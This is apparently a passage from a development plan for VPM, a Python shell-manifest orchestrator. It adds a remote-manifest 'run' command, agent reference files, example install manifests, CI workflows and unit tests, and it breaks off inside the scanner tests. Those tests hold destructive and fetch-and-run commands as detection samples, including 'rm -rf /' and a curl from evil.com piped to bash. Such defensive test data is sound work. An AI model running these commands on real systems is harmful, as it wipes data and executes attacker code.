In `cmd_status`, add to the `status_display` dict:

```python
                    AppStatus.ROLLED_BACK.value: Style.s("⏪ Rolled Back", Style.MAGENTA),
```

- [ ] **Step 6: Verify rollback command works**

```bash
cd /path/to/vpm
python3 -m vpm rollback --help
```

- [ ] **Step 7: Commit**

```bash
git add vpm/executor.py vpm/app.py vpm/cli.py
git commit -m "feat: add rollback command with reverse-order execution and best-effort recovery"
```

---

## Task 7: Remote Manifests — `vpm run`

**Files:**
- Modify: `vpm/app.py` (add `cmd_run`)
- Modify: `vpm/cli.py` (add `run` subcommand)

- [ ] **Step 1: Add cmd_run to app.py**

Add these imports at the top of `app.py` if not already present:

```python
import tempfile
import urllib.request
import urllib.error
```

Add this method to the `VPM` class:

```python
    # ── RUN (remote manifest) ────────────────────────────────────────────

    def cmd_run(self, args):
        """Fetch and execute a remote manifest."""
        UI.header("Run Remote Manifest", "🌐")

        source = args.source
        manifest_path = None

        # Determine source type
        if source.startswith(("http://", "https://")):
            url = source
        elif source.startswith("github:"):
            # github:user/repo or github:user/repo/path/file.yaml
            parts = source[7:]  # strip "github:"
            segments = parts.split("/", 2)
            if len(segments) < 2:
                UI.error("GitHub shorthand format: github:user/repo or github:user/repo/path/file.yaml")
                return
            user, repo = segments[0], segments[1]
            path = segments[2] if len(segments) > 2 else "vpm-manifest.yaml"
            # Try main branch first
            url = f"https://raw.githubusercontent.com/{user}/{repo}/main/{path}"
        elif Path(source).exists():
            # Local file — just redirect to install
            UI.info(f"Local file detected. Running as: vpm install --file {source}")
            args.file = source
            args.apps = []
            args.force = False
            args.dry_run = getattr(args, "dry_run", False)
            args.yes = getattr(args, "yes", False)
            args.skip_security = False
            self.cmd_install(args)
            return
        else:
            UI.error(f"Unknown source: {source}")
            UI.info("Supported formats:")
            UI.dim("  https://example.com/manifest.yaml")
            UI.dim("  github:user/repo")
            UI.dim("  github:user/repo/path/to/manifest.yaml")
            UI.dim("  ./local-file.yaml")
            return

        # Fetch
        UI.info(f"Fetching: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "vpm/1.1.0"})
            with urllib.request.urlopen(req, timeout=30) as resp:
                content = resp.read().decode("utf-8")
        except urllib.error.HTTPError as e:
            if e.code == 404 and "github:" in source and "/main/" in url:
                # Try master branch as fallback
                url = url.replace("/main/", "/master/")
                UI.dim(f"  main branch not found, trying master: {url}")
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "vpm/1.1.0"})
                    with urllib.request.urlopen(req, timeout=30) as resp:
                        content = resp.read().decode("utf-8")
                except Exception as e2:
                    UI.error(f"Failed to fetch manifest: {e2}")
                    return
            else:
                UI.error(f"Failed to fetch manifest: {e}")
                return
        except Exception as e:
            UI.error(f"Failed to fetch manifest: {e}")
            return

        UI.success(f"Fetched {len(content)} bytes")

        # Parse to validate
        apps = ManifestParser.parse_string(content)
        if not apps:
            UI.error("No apps found in remote manifest.")
            return

        UI.info(f"Found {len(apps)} app(s): {', '.join(a.name for a in apps)}")

        # Mandatory security scan for remote manifests
        scanner = SecurityScanner(self.config)
        findings = scanner.scan_apps(apps)
        if findings:
            scanner.display_findings(findings)
            if scanner.should_block(findings):
                UI.error("Blocked: Critical security issues in remote manifest. Cannot proceed.")
                return
            if not args.yes:
                if not UI.confirm("Security warnings found in remote manifest. Continue?"):
                    return
        else:
            UI.success("Security scan clean.")

        # Write to temp file and execute
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", prefix="vpm_remote_", delete=False
        ) as tmp:
            tmp.write(content)
            manifest_path = tmp.name

        try:
            UI.dim(f"Saved to: {manifest_path}")
            # Redirect to install
            args.file = manifest_path
            args.apps = getattr(args, "apps", []) or []
            args.force = False
            args.dry_run = getattr(args, "dry_run", False)
            args.skip_security = True  # Already scanned above
            self.cmd_install(args)
        finally:
            try:
                os.unlink(manifest_path)
            except OSError:
                pass
```

- [ ] **Step 2: Add run subcommand to cli.py**

In `build_parser()`, add after the `rollback` subparser:

```python
    # run
    p_run = subparsers.add_parser(
        "run",
        help="Fetch and execute a remote manifest",
        description="Download a manifest from a URL or GitHub repo, scan it for security "
                     "issues, and execute it. Security scanning is mandatory for remote manifests.",
    )
    p_run.add_argument(
        "source",
        help="URL, github:user/repo, or local file path",
    )
    p_run.add_argument(
        "--yes", "-y", action="store_true",
        help="Skip confirmation prompts",
    )
    p_run.add_argument(
        "--dry-run", "-n", action="store_true",
        help="Show what would be done without executing",
    )
```

Add to dispatch dict in `main()`:

```python
            "run": vpm.cmd_run,
```

- [ ] **Step 3: Verify run command works**

```bash
cd /path/to/vpm
python3 -m vpm run --help
```

- [ ] **Step 4: Commit**

```bash
git add vpm/app.py vpm/cli.py
git commit -m "feat: add vpm run for remote manifest fetching with mandatory security scan"
```

---

## Task 8: AI Agent Context Files

**Files:**
- Create: `AGENTS.md`
- Create: `llms.txt`

- [ ] **Step 1: Create AGENTS.md**

```markdown
# VPM — AI Agent Reference

> Concise reference for AI agents generating VPM manifests or using the CLI.
> Full docs: [README.md](README.md)

## What is VPM?

VPM (Virtual Package Manager) is a Python CLI that orchestrates shell commands with tracking, resume, dependency resolution, and full logging. Install via `pip install vpmx`, CLI command is `vpm`.

## Installation

```bash
pip install vpmx    # or: pipx install vpmx
vpm doctor          # verify environment
vpm version         # check version
```

Requires Python 3.10+. No external dependencies.

## Manifest Format

File: `vpm-manifest.yaml` (custom format, NOT standard YAML)

```yaml
# Comments start with #

[app_name] Optional description
requires: dependency1, dependency2

- label: What this step does
  run: shell command here

- label: Multi-line command
  run: |
    line one
    line two
    line three

- label: With rollback
  run: sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx

- run: shorthand without explicit label
```

### Rules

1. App names: `snake_case` only. `[docker_engine]` not `[Docker Engine]`
2. Every step MUST have a descriptive `label:`
3. Steps should be idempotent: `apt-get install -y`, `mkdir -p`, `ln -sf`
4. Group related commands into logical steps (not one per command, not 50 in one step)
5. Never use `cd` as a separate step — use within multi-line block
6. Use `sudo` explicitly where needed
7. Do NOT set `DEBIAN_FRONTEND=noninteractive` unless user asks
8. Use `$HOME` not `~` in commands
9. Always include a verification step as last step per app
10. Use `requires:` for dependencies between apps
11. Handle already-done states gracefully (check before creating)
12. For services: combine enable + start + status in one step
13. Add `rollback:` for reversible steps when possible

### Common Patterns

**Repository + Package:**
```yaml
[custom_repo]
- label: Add GPG key
  run: |
    curl -fsSL https://example.com/gpg.key | \
      sudo gpg --dearmor -o /etc/apt/keyrings/example.gpg --yes

- label: Add repository
  run: |
    echo "deb [signed-by=/etc/apt/keyrings/example.gpg] \
      https://packages.example.com/deb stable main" | \
      sudo tee /etc/apt/sources.list.d/example.list > /dev/null

- label: Install
  run: sudo apt-get update -y && sudo apt-get install -y example-package

- label: Verify
  run: example-package --version
```

**Docker Compose App:**
```yaml
[my_app]
requires: docker

- label: Create app directory
  run: mkdir -p $HOME/apps/myapp

- label: Start services
  run: |
    cd $HOME/apps/myapp
    docker compose up -d

- label: Verify
  run: docker compose -f $HOME/apps/myapp/docker-compose.yml ps
```

### Anti-Patterns

- DON'T: Separate steps for trivially related commands (one apt-get per package)
- DON'T: Assume environment persists between steps (export in step 1 is lost in step 2)
- DON'T: Use `cd` as standalone step (runs in subshell, no effect on next step)
- DON'T: Suppress errors silently (`|| true`) — handle explicitly with `if/then`
- DON'T: Hardcode user paths (`/home/deploy/`) — use `$HOME`

## CLI Reference

```bash
vpm init [path] [--force]              # Create manifest template
vpm install [apps...] [--file F]       # Execute manifest
  [--force] [--dry-run] [--yes] [--skip-security]
vpm audit [--file F]                   # Security scan without executing
vpm run <source> [--yes] [--dry-run]   # Fetch + scan + execute remote manifest
vpm rollback <app> [--dry-run]         # Undo using rollback: commands
vpm status [app]                       # Show installation status
vpm list                               # Alias for status
vpm logs <app> [--latest] [--step N] [--follow]
vpm retry <app>                        # Resume from failure point
vpm reset <app|--all> [--clean-logs]   # Clear tracking state
vpm setup [--user|--global]            # Install to PATH
vpm doctor                             # Diagnose environment
vpm completions [--shell S]            # Install shell completions
vpm version                            # Show version info
```

## Template for AI Agents

When asked to create a VPM manifest, use this structure:

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: [Brief description]
# Target OS: [Ubuntu 22.04 / Debian 12 / etc.]
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file this-file.yaml
#
# Prerequisites:
#   - [List any manual prerequisites]
#

[first_app] Description
- label: Descriptive step name
  run: command
  rollback: undo command

[second_app] Description
requires: first_app
- label: Descriptive step name
  run: |
    multi-line
    command

- label: Verify installation
  run: command --version
```

Always include: header comments, dependency declarations, verification steps, descriptive labels, rollback commands where possible.
```

- [ ] **Step 2: Create llms.txt**

```text
# VPM (vpmx on PyPI)
# Resumable shell command orchestrator for VPS/local environments
# Install: pip install vpmx | CLI: vpm
# Python 3.10+, zero dependencies

## Manifest format (NOT standard YAML):
# [app_name] description
# requires: dep1, dep2
# - label: Step name
#   run: command
#   rollback: undo command
# Multi-line: run: | (indented block follows)

## Key rules:
# snake_case app names, always use label:, idempotent steps
# $HOME not ~, sudo explicit, no cd as separate step
# requires: for deps, verification step last per app

## Commands:
# vpm install [apps] [--file F] [--dry-run] [--yes] [--force] [--skip-security]
# vpm audit [--file F]
# vpm run <url|github:user/repo> [--yes] [--dry-run]
# vpm rollback <app> [--dry-run]
# vpm status [app] | vpm list | vpm logs <app> [--latest|--step N|--follow]
# vpm retry <app> | vpm reset <app|--all> [--clean-logs]
# vpm init [path] | vpm setup [--user|--global] | vpm doctor | vpm completions
```

- [ ] **Step 3: Commit**

```bash
git add AGENTS.md llms.txt
git commit -m "docs: add AI agent context files (AGENTS.md, llms.txt)"
```

---

## Task 9: Example Manifests

**Files:**
- Create: `examples/docker.yaml`
- Create: `examples/node-server.yaml`
- Create: `examples/security-hardening.yaml`
- Create: `examples/dev-environment.yaml`
- Create: `examples/lamp-stack.yaml`

- [ ] **Step 1: Create examples/docker.yaml**

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: Docker Engine & Compose
# Target OS: Ubuntu 22.04+ / Debian 12+
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file docker.yaml
#
# After installation:
#   - Log out and back in for docker group to take effect
#   - Or run: newgrp docker
#

[docker_prerequisites] Install Docker prerequisites
- label: Update package lists
  run: sudo apt-get update -y
  rollback: echo "Nothing to undo for apt update"

- label: Install required packages
  run: |
    sudo apt-get install -y \
      ca-certificates curl gnupg lsb-release
  rollback: sudo apt-get remove -y ca-certificates gnupg lsb-release

[docker_engine] Docker Engine
requires: docker_prerequisites

- label: Add Docker GPG key
  run: |
    sudo install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
      sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg --yes
    sudo chmod a+r /etc/apt/keyrings/docker.gpg
  rollback: sudo rm -f /etc/apt/keyrings/docker.gpg

- label: Add Docker repository
  run: |
    echo "deb [arch=$(dpkg --print-architecture) \
      signed-by=/etc/apt/keyrings/docker.gpg] \
      https://download.docker.com/linux/ubuntu \
      $(. /etc/os-release && echo $VERSION_CODENAME) stable" | \
      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
  rollback: sudo rm -f /etc/apt/sources.list.d/docker.list

- label: Install Docker Engine
  run: |
    sudo apt-get update -y
    sudo apt-get install -y \
      docker-ce docker-ce-cli containerd.io \
      docker-buildx-plugin docker-compose-plugin
  rollback: |
    sudo apt-get remove -y docker-ce docker-ce-cli containerd.io \
      docker-buildx-plugin docker-compose-plugin

- label: Add current user to docker group
  run: sudo usermod -aG docker $USER

- label: Verify Docker installation
  run: |
    docker --version
    docker compose version
    sudo docker run --rm hello-world
```

- [ ] **Step 2: Create examples/node-server.yaml**

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: Node.js Server with PM2 & Nginx
# Target OS: Ubuntu 22.04+ / Debian 12+
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file node-server.yaml
#
# After installation:
#   - Configure your Nginx server block in /etc/nginx/sites-available/
#   - Deploy your Node.js app to $HOME/apps/
#

[node_js] Node.js via NVM
- label: Install NVM
  run: |
    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
  rollback: rm -rf $HOME/.nvm

- label: Install Node.js LTS
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    nvm install --lts
    nvm alias default node

- label: Verify Node.js
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    node --version
    npm --version

[pm2] PM2 Process Manager
requires: node_js

- label: Install PM2 globally
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    npm install -g pm2
  rollback: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    npm uninstall -g pm2

- label: Setup PM2 startup script
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    pm2 startup | tail -1 | bash

- label: Verify PM2
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    pm2 --version

[nginx_reverse_proxy] Nginx as Reverse Proxy
- label: Install Nginx
  run: sudo apt-get update -y && sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx

- label: Enable and start Nginx
  run: |
    sudo systemctl enable nginx
    sudo systemctl start nginx
    sudo systemctl status nginx --no-pager
  rollback: |
    sudo systemctl stop nginx
    sudo systemctl disable nginx

- label: Verify Nginx
  run: |
    nginx -v
    curl -sf http://localhost > /dev/null && echo "Nginx responding on port 80"
```

- [ ] **Step 3: Create examples/security-hardening.yaml**

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: Server Security Hardening
# Target OS: Ubuntu 22.04+ / Debian 12+
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file security-hardening.yaml
#
# Prerequisites:
#   - SSH access configured (this will restrict SSH settings)
#   - Know your SSH port if non-standard
#
# After installation:
#   - Test SSH access in a NEW terminal before closing current session
#   - Review /etc/fail2ban/jail.local for ban settings
#

[firewall] UFW Firewall
- label: Install UFW
  run: sudo apt-get update -y && sudo apt-get install -y ufw
  rollback: sudo apt-get remove -y ufw

- label: Configure firewall rules
  run: |
    sudo ufw default deny incoming
    sudo ufw default allow outgoing
    sudo ufw allow ssh
    sudo ufw allow http
    sudo ufw allow https
    sudo ufw --force enable
  rollback: sudo ufw --force disable

- label: Verify firewall
  run: sudo ufw status verbose

[fail2ban] Fail2Ban intrusion prevention
requires: firewall

- label: Install Fail2Ban
  run: sudo apt-get install -y fail2ban
  rollback: sudo apt-get remove -y fail2ban

- label: Configure Fail2Ban
  run: |
    sudo tee /etc/fail2ban/jail.local > /dev/null << 'EOF'
    [DEFAULT]
    bantime = 3600
    findtime = 600
    maxretry = 5
    backend = systemd

    [sshd]
    enabled = true
    port = ssh
    filter = sshd
    maxretry = 3
    bantime = 86400
    EOF
  rollback: sudo rm -f /etc/fail2ban/jail.local

- label: Enable and start Fail2Ban
  run: |
    sudo systemctl enable fail2ban
    sudo systemctl restart fail2ban
    sudo systemctl status fail2ban --no-pager
  rollback: |
    sudo systemctl stop fail2ban
    sudo systemctl disable fail2ban

- label: Verify Fail2Ban
  run: sudo fail2ban-client status

[ssh_hardening] SSH Configuration Hardening
requires: firewall

- label: Harden SSH configuration
  run: |
    sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
    sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
    sudo sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
    sudo sed -i 's/#MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config
    sudo sed -i 's/#ClientAliveInterval.*/ClientAliveInterval 300/' /etc/ssh/sshd_config
    sudo sed -i 's/#ClientAliveCountMax.*/ClientAliveCountMax 2/' /etc/ssh/sshd_config
  rollback: |
    if [ -f /etc/ssh/sshd_config.bak ]; then
      sudo cp /etc/ssh/sshd_config.bak /etc/ssh/sshd_config
    fi

- label: Restart SSH
  run: sudo systemctl restart sshd

- label: Verify SSH config
  run: sudo sshd -t && echo "SSH config valid"

[auto_updates] Automatic Security Updates
- label: Install unattended-upgrades
  run: |
    sudo apt-get install -y unattended-upgrades apt-listchanges
    sudo dpkg-reconfigure -plow unattended-upgrades
  rollback: sudo apt-get remove -y unattended-upgrades

- label: Verify auto-updates
  run: sudo systemctl status unattended-upgrades --no-pager
```

- [ ] **Step 4: Create examples/dev-environment.yaml**

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: Developer Environment Setup
# Target OS: Ubuntu 22.04+ / Debian 12+ / macOS
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file dev-environment.yaml
#
# Sets up a complete development environment with:
#   - Essential CLI tools
#   - Git configuration
#   - Python (pyenv)
#   - Node.js (NVM)
#   - Rust (rustup)
#

[base_tools] Essential CLI tools
- label: Update package lists
  run: sudo apt-get update -y

- label: Install essential tools
  run: |
    sudo apt-get install -y \
      curl wget git htop vim unzip jq tree \
      build-essential software-properties-common \
      libssl-dev libffi-dev zlib1g-dev \
      libbz2-dev libreadline-dev libsqlite3-dev

- label: Verify tools
  run: git --version && curl --version | head -1 && jq --version

[python_dev] Python via pyenv
requires: base_tools

- label: Install pyenv
  run: |
    curl -fsSL https://pyenv.run | bash
    export PYENV_ROOT="$HOME/.pyenv"
    export PATH="$PYENV_ROOT/bin:$PATH"
    eval "$(pyenv init -)"
  rollback: rm -rf $HOME/.pyenv

- label: Install Python 3.12
  run: |
    export PYENV_ROOT="$HOME/.pyenv"
    export PATH="$PYENV_ROOT/bin:$PATH"
    eval "$(pyenv init -)"
    pyenv install 3.12 --skip-existing
    pyenv global 3.12

- label: Verify Python
  run: |
    export PYENV_ROOT="$HOME/.pyenv"
    export PATH="$PYENV_ROOT/bin:$PATH"
    eval "$(pyenv init -)"
    python --version
    pip --version

[node_dev] Node.js via NVM
requires: base_tools

- label: Install NVM and Node.js LTS
  run: |
    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    nvm install --lts
    nvm alias default node
  rollback: rm -rf $HOME/.nvm

- label: Verify Node.js
  run: |
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    node --version
    npm --version

[rust_dev] Rust via rustup
requires: base_tools

- label: Install Rust
  run: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
  rollback: rustup self uninstall -y

- label: Verify Rust
  run: |
    source $HOME/.cargo/env
    rustc --version
    cargo --version
```

- [ ] **Step 5: Create examples/lamp-stack.yaml**

```yaml
# ═══════════════════════════════════════════════════════
# VPM Manifest: LAMP Stack (Linux, Apache, MySQL, PHP)
# Target OS: Ubuntu 22.04+ / Debian 12+
# ═══════════════════════════════════════════════════════
#
# Usage:
#   vpm install --file lamp-stack.yaml
#
# After installation:
#   - MySQL root password is set during interactive setup
#   - Configure virtual hosts in /etc/apache2/sites-available/
#   - PHP info page at http://localhost/info.php (remove in production!)
#

[apache] Apache Web Server
- label: Install Apache
  run: sudo apt-get update -y && sudo apt-get install -y apache2
  rollback: |
    sudo systemctl stop apache2
    sudo apt-get remove -y apache2

- label: Enable and start Apache
  run: |
    sudo systemctl enable apache2
    sudo systemctl start apache2
    sudo systemctl status apache2 --no-pager
  rollback: |
    sudo systemctl stop apache2
    sudo systemctl disable apache2

- label: Enable mod_rewrite
  run: |
    sudo a2enmod rewrite
    sudo systemctl restart apache2

- label: Verify Apache
  run: curl -sf http://localhost > /dev/null && echo "Apache responding"

[mysql] MySQL Server
requires: apache

- label: Install MySQL
  run: sudo apt-get install -y mysql-server
  rollback: |
    sudo systemctl stop mysql
    sudo apt-get remove -y mysql-server

- label: Start MySQL
  run: |
    sudo systemctl enable mysql
    sudo systemctl start mysql
    sudo systemctl status mysql --no-pager
  rollback: |
    sudo systemctl stop mysql
    sudo systemctl disable mysql

- label: Secure MySQL installation
  run: sudo mysql_secure_installation

- label: Verify MySQL
  run: sudo mysql -e "SELECT VERSION();" && echo "MySQL running"

[php] PHP with Apache module
requires: apache, mysql

- label: Install PHP and common extensions
  run: |
    sudo apt-get install -y \
      php libapache2-mod-php php-mysql \
      php-curl php-json php-mbstring php-xml php-zip
  rollback: |
    sudo apt-get remove -y php libapache2-mod-php php-mysql \
      php-curl php-json php-mbstring php-xml php-zip

- label: Restart Apache for PHP
  run: sudo systemctl restart apache2

- label: Create PHP info page
  run: |
    echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php > /dev/null
    echo "PHP info page created at http://localhost/info.php"
    echo "WARNING: Remove this file in production!"
  rollback: sudo rm -f /var/www/html/info.php

- label: Verify PHP
  run: php -v && curl -sf http://localhost/info.php | head -5
```

- [ ] **Step 6: Commit**

```bash
git add examples/
git commit -m "docs: add example manifests for docker, node, security, dev-env, and LAMP"
```

---

## Task 10: CI/CD Workflows

**Files:**
- Create: `.github/workflows/ci.yml`
- Create: `.github/workflows/publish.yml`

- [ ] **Step 1: Create .github/workflows/ci.yml**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.10", "3.11", "3.12", "3.13"]

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Verify syntax
        run: python -m py_compile vpm/*.py

      - name: Verify package loads
        run: |
          python -m vpm version
          python -m vpm doctor

      - name: Run tests
        run: python -m pytest tests/ -v
        if: hashFiles('tests/') != ''

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install ruff
        run: pip install ruff

      - name: Lint
        run: ruff check vpm/
```

- [ ] **Step 2: Create .github/workflows/publish.yml**

```yaml
name: Publish to PyPI

on:
  push:
    tags:
      - "v*"

permissions:
  id-token: write

jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install build tools
        run: pip install build

      - name: Build package
        run: python -m build

      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
```

- [ ] **Step 3: Commit**

```bash
git add .github/
git commit -m "ci: add GitHub Actions for CI and PyPI publishing"
```

---

## Task 11: Unit Tests

**Files:**
- Create: `tests/__init__.py`
- Create: `tests/test_manifest.py`
- Create: `tests/test_models.py`
- Create: `tests/test_scanner.py`
- Create: `tests/test_resolver.py`

- [ ] **Step 1: Create tests/__init__.py**

```python
```

(Empty file — just marks the directory as a package.)

- [ ] **Step 2: Create tests/test_manifest.py**

```python
"""Tests for the manifest parser."""

import pytest
from vpm.manifest import ManifestParser, ManifestApp


class TestManifestParser:
    def test_parse_single_app(self):
        content = """
[my_app] My Application
- label: Step one
  run: echo hello
"""
        apps = ManifestParser.parse_string(content)
        assert len(apps) == 1
        assert apps[0].name == "my_app"
        assert apps[0].description == "My Application"
        assert len(apps[0].steps) == 1
        assert apps[0].steps[0]["label"] == "Step one"
        assert apps[0].steps[0]["command"] == "echo hello"

    def test_parse_multiple_apps(self):
        content = """
[app_a] First
- label: A step
  run: echo a

[app_b] Second
- label: B step
  run: echo b
"""
        apps = ManifestParser.parse_string(content)
        assert len(apps) == 2
        assert apps[0].name == "app_a"
        assert apps[1].name == "app_b"

    def test_parse_dependencies(self):
        content = """
[base]
- run: echo base

[child]
requires: base
- run: echo child
"""
        apps = ManifestParser.parse_string(content)
        assert apps[1].requires == ["base"]

    def test_parse_multiple_dependencies(self):
        content = """
[app]
requires: dep1, dep2, dep3
- run: echo app
"""
        apps = ManifestParser.parse_string(content)
        assert apps[0].requires == ["dep1", "dep2", "dep3"]

    def test_parse_multiline_command(self):
        content = """
[app]
- label: Multi
  run: |
    line one
    line two
    line three
"""
        apps = ManifestParser.parse_string(content)
        cmd = apps[0].steps[0]["command"]
        assert "line one" in cmd
        assert "line two" in cmd
        assert "line three" in cmd

    def test_parse_shorthand_step(self):
        content = """
[app]
- echo hello world
"""
        apps = ManifestParser.parse_string(content)
        assert apps[0].steps[0]["command"] == "echo hello world"

    def test_parse_comments_ignored(self):
        content = """
# This is a comment
[app]
# Another comment
- label: Step
  run: echo hello
# Trailing comment
"""
        apps = ManifestParser.parse_string(content)
        assert len(apps) == 1
        assert len(apps[0].steps) == 1

    def test_parse_empty_manifest(self):
        apps = ManifestParser.parse_string("")
        assert apps == []

    def test_parse_rollback_single_line(self):
        content = """
[app]
- label: Install
  run: sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx
"""
        apps = ManifestParser.parse_string(content)
        assert apps[0].steps[0].get("rollback") == "sudo apt-get remove -y nginx"

    def test_parse_rollback_multiline(self):
        content = """
[app]
- label: Setup
  run: |
    sudo systemctl enable nginx
    sudo systemctl start nginx
  rollback: |
    sudo systemctl stop nginx
    sudo systemctl disable nginx
"""
        apps = ManifestParser.parse_string(content)
        rb = apps[0].steps[0].get("rollback", "")
        assert "stop nginx" in rb
        assert "disable nginx" in rb

    def test_parse_step_without_rollback(self):
        content = """
[app]
- label: Verify
  run: nginx --version
"""
        apps = ManifestParser.parse_string(content)
        assert apps[0].steps[0].get("rollback") is None

    def test_auto_label_generation(self):
        content = """
[app]
- run: echo hello world
"""
        apps = ManifestParser.parse_string(content)
        label = apps[0].steps[0]["label"]
        assert label  # Should not be empty
```

- [ ] **Step 3: Create tests/test_models.py**

```python
"""Tests for data models."""

from vpm.models import StepRecord, AppRecord, StepStatus, AppStatus


class TestStepRecord:
    def test_default_status(self):
        s = StepRecord(index=0, label="test", command="echo hi")
        assert s.status == StepStatus.PENDING.value

    def test_to_dict_roundtrip(self):
        s = StepRecord(
            index=0, label="test", command="echo hi",
            status=StepStatus.SUCCESS.value, exit_code=0,
            rollback_command="echo undo",
        )
        d = s.to_dict()
        s2 = StepRecord.from_dict(d)
        assert s2.label == "test"
        assert s2.status == StepStatus.SUCCESS.value
        assert s2.rollback_command == "echo undo"

    def test_rollback_fields_default_none(self):
        s = StepRecord(index=0, label="test", command="echo hi")
        assert s.rollback_command is None
        assert s.rollback_status is None
        assert s.rollback_log_file is None


class TestAppRecord:
    def test_recalculate_completed(self):
        steps = [
            StepRecord(index=0, label="a", command="a", status=StepStatus.SUCCESS.value),
            StepRecord(index=1, label="b", command="b", status=StepStatus.SUCCESS.value),
        ]
        r = AppRecord(name="test", display_name="test", steps=steps)
        r.recalculate()
        assert r.status == AppStatus.COMPLETED.value
        assert r.completed_steps == 2
        assert r.failed_steps == 0

    def test_recalculate_partial(self):
        steps = [
            StepRecord(index=0, label="a", command="a", status=StepStatus.SUCCESS.value),
            StepRecord(index=1, label="b", command="b", status=StepStatus.FAILED.value),
        ]
        r = AppRecord(name="test", display_name="test", steps=steps)
        r.recalculate()
        assert r.status == AppStatus.PARTIAL.value

    def test_recalculate_failed(self):
        steps = [
            StepRecord(index=0, label="a", command="a", status=StepStatus.FAILED.value),
        ]
        r = AppRecord(name="test", display_name="test", steps=steps)
        r.recalculate()
        assert r.status == AppStatus.FAILED.value

    def test_recalculate_pending(self):
        steps = [
            StepRecord(index=0, label="a", command="a", status=StepStatus.PENDING.value),
        ]
        r = AppRecord(name="test", display_name="test", steps=steps)
        r.recalculate()
        assert r.status == AppStatus.PENDING.value

    def test_to_dict_roundtrip(self):
        steps = [StepRecord(index=0, label="a", command="a")]
        r = AppRecord(name="test", display_name="test (Test)", steps=steps, requires=["dep"])
        d = r.to_dict()
        r2 = AppRecord.from_dict(d)
        assert r2.name == "test"
        assert r2.requires == ["dep"]
        assert len(r2.steps) == 1

    def test_rolled_back_status_exists(self):
        assert AppStatus.ROLLED_BACK.value == "rolled_back"
```

- [ ] **Step 4: Create tests/test_scanner.py**

```python
"""Tests for the security scanner."""

import pytest
from unittest.mock import MagicMock
from vpm.scanner import SecurityScanner, SecurityFinding, Severity
from vpm.config import Config


def make_scanner(level="warn", check_urls=False):
    config = MagicMock(spec=Config)
    config.load_config.return_value = {
        "security": {"level": level, "check_urls": check_urls}
    }
    return SecurityScanner(config)


def make_app(name, steps):
    """Create a mock app-like object with steps as list of dicts."""
    class FakeApp:
        def __init__(self, n, s):
            self.name = n
            self.steps = s
    return FakeApp(name, steps)


class TestPatternDetection:
    def test_detect_rm_rf_root(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Danger", "command": "rm -rf /"}])
        findings = scanner.scan_apps([app])
        critical = [f for f in findings if f.severity == Severity.CRITICAL.value]
        assert len(critical) >= 1
        assert any("system-wipe" in f.pattern_name for f in critical)

    def test_detect_pipe_to_shell(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Install", "command": "curl http://evil.com/script | bash"}])
        findings = scanner.scan_apps([app])
        high = [f for f in findings if f.severity == Severity.HIGH.value]
